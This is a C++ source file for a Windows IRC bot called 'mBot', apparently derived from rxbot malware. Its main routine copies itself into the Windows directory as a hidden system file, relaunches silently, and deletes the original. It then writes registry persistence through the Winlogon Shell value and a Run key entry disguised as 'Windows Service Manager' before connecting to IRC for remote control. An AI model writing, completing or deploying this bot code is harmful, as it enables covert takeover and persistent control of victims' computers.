#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <winsock2.h>
#pragma comment (lib, "ws2_32.lib")
#include <stdexcept>
#include "mBot.h"
#include "irc.h"
#include "structure.h"
#include "ircEvents.h"
#pragma comment (lib, "Advapi32.lib")
using std::runtime_error;
using std::bad_alloc;
using std::exception;
using std::string;
#include <winreg.h>
#include <windows.h>
#include "CMutex.h"
std::string rndnickletter();
void InstallSysService(char *nfilename);
extern IsUpd Is_Upd;
mBot *gMBot;
extern cAim_t aim;
mBot::mBot ()
{
	WSADATA wsaData;
	if (WSAStartup(0x0202, &wsaData) != 0)
		throw std::runtime_error ("!!! unable to find/initialize winsock DLL");
}


mBot::~mBot ()
{
	WSACleanup();
}

int mBot::mBotMain(int argc, char **argv)
{
		
	ircData_t ircData;
	ircData.port = ircPort;
	ircHandler irch;
	mIrc = new irc(ircData, irch);
	mIrc->connect();
	mIrc->mainLoop();
	return EXIT_SUCCESS;
}

int main (int argc, char **argv)
{
	Sleep(500);
	
	//takes care of exe name...
	char fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],windir[MAX_PATH];
	GetWindowsDirectory(windir, sizeof(windir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, windir) == NULL) {
		char tmpfilename[MAX_PATH];

		sprintf(tmpfilename, "%s\\%s", windir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED) {
					Sleep(15000);
			} else
				break; // just continue, it's not worth retrying.
		}
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		
		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, windir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			ExitProcess(EXIT_SUCCESS);
		}
	}
	if (__argc > 2) {
		// now the clone is running --> kill original exe
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(2000); //wait for 2 sec to make sure process has fully exited 
			DeleteFile(__argv[2]);
		}
	}
	//rxbot code...w/e

	//defines
	aim.x = TRUE;
	Is_Upd.x = FALSE;
	//check if its already running..
	CMutex cMutex;
	cMutex.DoConsole();
	AutoStartRegs(argv[0]);
	int retVal = EXIT_FAILURE;
	try
	{
		gMBot = new mBot();
		retVal = gMBot->mBotMain(argc, argv);
	}
	catch (const bad_alloc&)
	{
		printf("!!! out of memory\n");
	}
	catch (const runtime_error& e)
	{
		printf("!!! runtime_error: \"%s\"\n", e.what());
	}
	return retVal;
	
	
}
string rndnickletter()
{
	char strbuf[16];
	srand(GetTickCount());
 	int randlen = (rand()%3)+maxrand;
	int i = 0;
	while(i<randlen)
	{
		strbuf[i] = (rand()%26)+97;
		i++;
	};
 	strbuf[i] = '\0';
 	return lex<string>(strbuf);
 }

void AutoStartRegs(char *nfilename)
{
	char exkey[] = "Shell";
	string exkeyval = "Explorer.exe " + string(nfilename);
	HKEY dexKey;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &dexKey, NULL);
	RegSetValueEx(dexKey, exkey, NULL, REG_SZ, (const unsigned char *)exkeyval.c_str(), strlen(exkeyval.c_str()));
	RegCloseKey(dexKey);
	
	char newreg[] = "Windows Service Manager";
	string newkeyval = string(nfilename);
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, newreg, 0, REG_SZ, (const unsigned char *)newkeyval.c_str(), strlen(newkeyval.c_str()));  
	RegCloseKey(key);  
	return;
}

void UnAutoStartRegs()
{
	char exkey[] = "Shell";
	string exkeyval = "Explorer.exe";
	HKEY dexKey;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &dexKey, NULL);
	RegSetValueEx(dexKey, exkey, NULL, REG_SZ, (const unsigned char *)exkeyval.c_str(), strlen(exkeyval.c_str()));
	RegCloseKey(dexKey);
	return;
}
